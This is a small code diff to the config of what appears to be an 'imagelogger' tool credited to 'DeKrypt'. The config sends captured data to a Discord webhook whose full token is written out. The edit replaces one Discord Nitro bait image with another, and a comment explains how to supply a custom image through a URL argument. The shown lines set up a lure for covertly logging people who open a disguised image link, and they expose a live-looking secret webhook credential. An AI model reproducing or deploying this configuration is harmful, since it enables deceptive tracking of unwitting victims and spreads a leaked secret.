@@ -11,7 +11,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1376452321181044736/Zrcj-k15c0mPLzlPJGs5aSwdJAWXbF0OrHTLoi7yFc_V-1pxJzvZ-anQBYlmTHqe6ztE",
-    "image": "https://www.androidauthority.com/wp-content/uploads/2023/09/Discord-Nitro-banner.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://techcult.com/wp-content/uploads/2023/08/How-Long-Does-Discord-Nitro-Boost-Last-1024x683.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
